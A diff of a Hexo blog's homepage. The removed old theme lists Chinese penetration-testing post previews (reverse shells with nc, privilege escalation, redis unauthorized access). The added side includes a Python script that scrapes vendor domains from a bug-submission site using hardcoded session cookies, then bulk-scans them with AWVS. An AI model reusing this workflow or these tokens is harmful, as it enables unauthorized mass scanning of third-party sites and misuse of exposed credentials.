@@ -1,705 +1,1514 @@
 <!DOCTYPE html>
-<html lang="en">
-
-<!-- Head tag -->
+<html>
 <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="">
-    <meta name="keyword" content="">
-    <meta name="theme-color" content="#600090">
-    <meta name="msapplication-navbutton-color" content="#600090">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
-    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
-    <link rel="alternate" type="application/atom+xml" title="pengpengp&#39;s BLOG" href="/atom.xml">
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
-    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
-    <title>
-        
-        
-        
-    </title>
+  <meta charset="utf-8">
+  
 
-    <link rel="canonical" href="https://pengpengp.github.io/">
-
-    <!-- Bootstrap Core CSS -->
-    
-<link rel="stylesheet" href="/css/bootstrap.min.css">
-
-
-    <!-- Custom CSS -->
-    
-<link rel="stylesheet" href="/css/blog-style.css">
-
-
-    <!-- Pygments Github CSS -->
-    
-<link rel="stylesheet" href="/css/syntax.css">
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
 <meta name="generator" content="Hexo 5.2.0"></head>
 
-<style>
-
-    header.intro-header {
-        background-image: url('')
-    }
-</style>
-<!-- hack iOS CSS :active style -->
-<body ontouchstart="" class="animated fadeIn">
-<!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "false" data-istags="false
-" data-ishome = "true" >
-    <div class="container-fluid">
-        <!-- Brand and toggle get grouped for better mobile display -->
-        <div class="navbar-header page-scroll">
-            <button type="button" class="navbar-toggle">
-                <span class="sr-only">Toggle navigation</span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-            </button>
-            <a class="navbar-brand animated pulse" href="/">
-                <span class="brand-logo">
-                    pengpengp&#39;s BLOG
-                </span>
-                's Blog
-            </a>
-        </div>
-
-        <!-- Collect the nav links, forms, and other content for toggling -->
-        <!-- Known Issue, found by Hux:
-            <nav>'s height woule be hold on by its content.
-            so, when navbar scale out, the <nav> will cover tags.
-            also mask any touch event of tags, unfortunately.
-        -->
-        <!-- /.navbar-collapse -->
-        <div id="huxblog_navbar">
-            <div class="navbar-collapse">
-                <ul class="nav navbar-nav navbar-right">
-                    <li>
-                        <a href="/">Home</a>
-                    </li>
-					
-                    
-					
-					
-                </ul>
-            </div>
-        </div>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
     </div>
-    <!-- /.container -->
-</nav>
-<script>
-    // Drop Bootstarp low-performance Navbar
-    // Use customize navbar with high-quality material design animation
-    // in high-perf jank-free CSS3 implementation
-//    var $body   = document.body;
-    var $toggle = document.querySelector('.navbar-toggle');
-    var $navbar = document.querySelector('#huxblog_navbar');
-    var $collapse = document.querySelector('.navbar-collapse');
-
-    $toggle.addEventListener('click', handleMagic)
-    function handleMagic(e){
-        if ($navbar.className.indexOf('in') > 0) {
-        // CLOSE
-            $navbar.className = " ";
-            // wait until animation end.
-            setTimeout(function(){
-                // prevent frequently toggle
-                if($navbar.className.indexOf('in') < 0) {
-                    $collapse.style.height = "0px"
-                }
-            },400)
-        }else{
-        // OPEN
-            $collapse.style.height = "auto"
-            $navbar.className += " in";
-        }
-    }
-</script>
-
-<!-- Main Content -->
-
-
-<style>
-
-    .custom-haojen-container .post-preview:nth-of-type(1),
-    .custom-haojen-container .post-preview-poetry:nth-of-type(1) {
-        text-align: center;
-        background-repeat: no-repeat;
-        border-radius: 3px;
-        background-size: cover;
-        padding: 0;
-        height: 300px;
-        display: table;
-        width: 100%;
-        background-color: rgba(0, 0, 0, 0.16);
-    }
-
-    /*去掉诗歌的背景图片*/
-    .custom-haojen-container .post-preview-poetry:nth-of-type(1) {
-        background-image: none !important;
-        background-color: rgba(255, 248, 220, 0.5);
-    }
-
-    .custom-haojen-container .post-preview:nth-child(1) h2,
-    .custom-haojen-container .post-preview:nth-child(1) .post-meta,
-    .custom-haojen-container .post-preview:nth-child(1) .post-subtitle {
-        text-shadow: 0 0 40px rgba(0, 0, 0, 1);
-        letter-spacing: 1px;
-        color: #fff;
-        margin-top: 0;
-        padding-left: 60px;
-        padding-right: 60px;
-    }
-
-    .custom-haojen-container .post-preview:nth-child(1) .post-meta {
-        font-size: .9em;
-        font-weight: 300;
-        margin-top: 0;
-    }
-
-    .custom-haojen-container .post-preview-poetry:nth-child(1) .post-subtitle {
-        letter-spacing: 6px;
-        font-size: 18px;
-        font-family: unset;
-        font-weight: 400;
-        color: rgba(0, 0, 0, .75)
-    }
-
-    /*不显示摘要*/
-    .custom-haojen-container .post-preview:nth-child(1) .post-content-preview {
-        display: none
-    }
-
-    /*只第一个显示背景图片*/
-    .custom-haojen-container .post-preview:not(:nth-child(1)) {
-        background-image: none !important;
-    }
-
-    /*第一个分界线去掉*/
-    .custom-haojen-container hr:nth-of-type(1) {
-        display: none;
-    }
-
-    /*主题*/
-    .custom-haojen-container .post-preview:nth-of-type(1) > a {
-        display: table-cell;
-        vertical-align: middle;
-    }
-
-    /*诗词标题*/
-    .custom-haojen-container .post-preview-poetry:nth-child(1) h2 {
-        font-size: 35px;
-        font-family: STKaiti;
-        color: rgba(0, 0, 0, .8);
-    }
-
-    .custom-haojen-container .post-preview-poetry:nth-of-type(1) .post-meta {
-        color: #0e2231;
-    }
-
-    @media (max-width: 768px) {
-        .custom-haojen-container .post-preview:nth-child(1) {
-            height: 240px;
-        }
-
-        .custom-haojen-container .post-preview-poetry:nth-child(1) h2 {
-            font-size: 28px !important;
-            margin-top: 0;
-        }
-
-        .custom-haojen-container .post-preview:nth-child(1) .post-subtitle {
-            font-size: 18px;
-            font-weight: 400;
-            padding-left: 0;
-            padding-right: 0;
-        }
-
-        .custom-haojen-container .post-preview:nth-of-type(1) > a {
-            padding: 20px
-        }
-    }
-
-    /*手机屏幕*/
-    @media (max-width: 400px) {
-        .custom-haojen-container .post-preview:nth-child(1) {
-            height: 195px;
-        }
-
-        .custom-haojen-container .post-preview-poetry:nth-child(1) h2 {
-            font-size: 20px !important;
-        }
-
-        .custom-haojen-container .post-preview:nth-child(1) .post-subtitle {
-            font-size: 16px;
-        }
-
-        .custom-haojen-container .post-preview:nth-child(1) a {
-            padding: 30px 20px;
-        }
-    }
-</style>
-
-<!-- Page Header -->
-<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 visible-xs-block visible-sm-block">
-    <div class="row">
-        <header class="intro-header">
-            <div class="container">
-                <div class="site-heading text-center">
-                    <div class="about-me">
-                        <!--移动端头部显示-->
-                        <img src=""/>
-                        <h5><a href="/about/">pengpengp</a></h5>
-                        <p></p>
-                    </div>
-                </div>
-            </div>
-        </header>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
     </div>
-</div>
-<!-- Main Content -->
-<div class="container custom-haojen-container">
-    <!-- Post Container -->
-    <div class="row">
-        <div class="col-lg-8 col-lg-offset-1 col-md-8 col-md-offset-1 col-sm-12 col-xs-12 post-container">
-            <!-- Main Content -->
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/03/31/python批量爬取URL配合AWVS/">
-        <h2 class="post-title">
-            python批量爬取URL配合AWVS
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-31
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                1.1.     用这段代码先爬出厂商的URL地址,写入到一个文本文档
-1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/03/24/first-shell/">
-        <h2 class="post-title">
-            first shell
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-24
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                12345678910111213141516171819#!/bin/bashecho $*if [ $# == 0 ];then    echo &#x27;-h获取帮助&#x27;;    exitelif [ $1 = &#x27;-h&#x27; ];then    echo &#x2..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/03/24/docker-api/">
-        <h2 class="post-title">
-            php与docker-api与私有仓库
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-24
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                1.封装的方法：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/03/24/域渗透/">
-        <h2 class="post-title">
-            域渗透
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-24
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                一。搭建域环境：作用：批量控制
-1.域控制器的配置：服务器管理器-&gt;添加角色-&gt;勾选域服务-&gt;下一步-&gt;安装运行-&gt;dcpromo启动域安装程序-&gt;创建一个”林”-&gt;命名-&gt;林功能级别”默认”-&gt;一直下一步-&gt;设置域控密码-&gt;一直..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/03/16/常用渗透工具/">
-        <h2 class="post-title">
-            常用渗透工具
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-16
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                web测试常用工具整理:一.burpsuite1.Macros模块:project-&gt;macros爆破数字验证码:https://blog.csdn.net/d_pokemon/article/details/78194351
- 2.intruder模块四种攻击方式:
-1234Sniper..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/03/10/内网穿透工具/">
-        <h2 class="post-title">
-            内网穿透工具
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-10
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                内网转发的三种：反弹shell、反弹端口、反弹代理虚拟终端和bash -i的区别：
-bash -i是交互式的shell，很多程序都要求用交互式shell
-一。反弹shell
-nc的使用：
-
-有两种方式：
-1.被动连接(让被攻击者反弹到监听)    powershell中反弹命令：    nc i..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/03/03/提权/">
-        <h2 class="post-title">
-            提权
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-03
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                
-
-0x00本地服务提权windows1.从外部攻击服务器
-
-ms17-010
-
-ms08-067
-
-…
-
-
-  2.从内部攻击服务器
-
-上传提权脚本    x64.exe\pr.exe
-然后运行就可以了
-
-linux只能从内部攻击服务器
-
-获取内核版本，操作系统版本，
-
-去找对应的exp
-
-下..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/03/03/grep-find-awk-sed指令基础/">
-        <h2 class="post-title">
-            grep.find.awk.sed指令基础
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-03
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                grep和find指定(匹配字符和文件名)
-grep ‘字符串’ 源文件，例如grep ‘代码执行’  第*  —从包含“第”的文件中查找包含代码执行的字符串
-grep –color ‘字符串’ 文件名—匹配到的字符串高亮
-find 目录 -name ‘字符串’，举例：find ./ -name..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/02/24/信息搜集/">
-        <h2 class="post-title">
-            信息搜集
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-02-24
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                只要能挖掘到对黑客有用的信息,就是信息泄露
-目标：只要能挖掘到对黑客有用的信息,就是信息泄露*****需要搜集的信息:    分类(web安全方向)1234561.web服务器信息(中间件)2.web应用信息(web脚本,数据库类型,cms)3.服务器操作系统信息(系统版本)4.服务器其他信息(..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/02/18/redis未授权漏洞/">
-        <h2 class="post-title">
-            redis未授权漏洞
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-02-18
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等防御：限制redis权限一。 数据库原理：redis数据库(临时存储数据库)下载redis文件
-
-解压，`make --&gt;cd src make--&g..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-
-<!-- 翻页 pager -->
-
-<ul class="pager">
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/10/19/hello-world/" class="article-date">
+  <time datetime="2020-10-19T06:25:32.906Z" itemprop="datePublished">2020-10-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
     
     
-    <li class="next">
-        <a href="/page/2/">Older Posts &rarr;</a>
-    </li>
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/19/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/10/19/hello-world/" data-id="ckgg5oe0l000dzov2b3o0crtz" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-python批量爬取URL配合AWVS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/31/python%E6%89%B9%E9%87%8F%E7%88%AC%E5%8F%96URL%E9%85%8D%E5%90%88AWVS/" class="article-date">
+  <time datetime="2019-03-31T00:18:31.000Z" itemprop="datePublished">2019-03-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/31/python%E6%89%B9%E9%87%8F%E7%88%AC%E5%8F%96URL%E9%85%8D%E5%90%88AWVS/">python批量爬取URL配合AWVS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>1.1.     用这段代码先爬出厂商的URL地址,写入到一个文本文档</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> queue <span class="keyword">as</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:                              <span class="comment">#导入queue&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#厂商id=(30-4555)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#厂商id=(61785,61184)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建请求</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qq</span>(<span class="params">que</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> que.empty():</span><br><span class="line"></span><br><span class="line">        <span class="built_in">id</span>=que.get()</span><br><span class="line"></span><br><span class="line">        url=<span class="string">&#x27;https://URL/Loo/submit?cid=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">        cookie =&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;b1e5pmgfeamvopn8fi5if23151&#x27;</span>,<span class="string">&#x27;__guid&#x27;</span>:<span class="string">&#x27;138613664.2718517027106703000.1552008209413.7473&#x27;</span>,<span class="string">&#x27;__DC_sid&#x27;</span>:<span class="string">&#x27;138613664.506728041006725900.1553871635984.757&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>:<span class="string">&#x27;u%3D360H3104709625%26n%3D%26le%3D%26m%3DZGp2WGWOWGWOWGWOWGWOWGWOZwVm%26qid%3D3104709625%26im%3D1_t01923d359dad425928%26src%3Dpcw_webscan%26t%3D1&#x27;</span>,<span class="string">&#x27;T&#x27;</span>:<span class="string">&#x27;s%3D184251f5a38ba45d06144c26cf5f02e2%26t%3D1552008252%26lm%3D%26lf%3D2%26sk%3Dc19128be09646066b6bb9a543a35569a%26mt%3D1552008252%26rc%3D%26v%3D2.0%26a%3D1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        qingqiu = requests.get(url,cookies=cookie,headers=headers).text.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#qingqiu.decode(&#x27;raw_unicode_escape&#x27;)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#qingqiu.encoding = qingqiu.apparent_encoding</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#print (qingqiu)</span></span><br><span class="line"></span><br><span class="line">        company = re.findall(<span class="string">r&#x27;&quot;请输入厂商名称&quot;\svalue=&quot;(.*?)&quot;&#x27;</span>,qingqiu)</span><br><span class="line"></span><br><span class="line">        yuming = re.findall(<span class="string">r&#x27;&quot;请输入厂商域名&quot;\svalue=&quot;(.*?)&quot;&#x27;</span>,qingqiu)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;https://URL/Loo/submit?cid=&#123;&#125;扫描成功!&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;list.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#f.write((company)[0])</span></span><br><span class="line"></span><br><span class="line">        f.write((yuming)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> que.empty():</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;url获取完毕!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建队列</span></span><br><span class="line"></span><br><span class="line">que = Queue.Queue()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">4555</span>):</span><br><span class="line"></span><br><span class="line">    que.put(q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建线程</span></span><br><span class="line"></span><br><span class="line">xianchengmax=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    xiancheng = threading.Thread(target=qq,args=(que,))</span><br><span class="line"></span><br><span class="line">    xianchengmax.append(xiancheng)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> xiancheng <span class="keyword">in</span> xianchengmax:</span><br><span class="line"></span><br><span class="line">    xiancheng.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> xiancheng <span class="keyword">in</span> xianchengmax:</span><br><span class="line"></span><br><span class="line">    xiancheng.join()</span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="2">
+<li><p>再从文本文档中筛选出合格的URL,(^[http://|https://].*)这个可以先把规范的URL匹配出来</p>
+<p><img src="python%E6%89%B9%E9%87%8F%E7%88%AC%E5%8F%96URL%E9%85%8D%E5%90%88AWVS/1.png" alt="筛选有开头的URL"></p>
+</li>
+</ol>
+<p>3.1.     把不合适的URL修改成合格的URL,添加到AWVS中,AWVS只能之别出标准格式的URL,所以这些不带http://的就需要修改一下，如果还剩下了  也可以再匹配,这样逐步把URL的格式规范化了</p>
+<p><img src="python%E6%89%B9%E9%87%8F%E7%88%AC%E5%8F%96URL%E9%85%8D%E5%90%88AWVS%5C2.png" alt="给没开头的URL添加开头"></p>
+<ol start="4">
+<li><p>把选好的URL加入AWVS的批量扫描列表中<a target="_blank" rel="noopener" href="http://localhost:8183/">http://localhost:8183/</a></p>
+</li>
+<li><p>可以开始扫描了</p>
+<p><img src="python%E6%89%B9%E9%87%8F%E7%88%AC%E5%8F%96URL%E9%85%8D%E5%90%88AWVS%5C3.png" alt="AWVS批扫页面"></p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/03/31/python%E6%89%B9%E9%87%8F%E7%88%AC%E5%8F%96URL%E9%85%8D%E5%90%88AWVS/" data-id="ckgg5oe0p000nzov28yux9ma9" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python-%E6%89%AB%E6%8F%8F/" rel="tag">python 扫描</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-first-shell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/24/first-shell/" class="article-date">
+  <time datetime="2019-03-24T09:20:15.000Z" itemprop="datePublished">2019-03-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/24/first-shell/">first shell</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
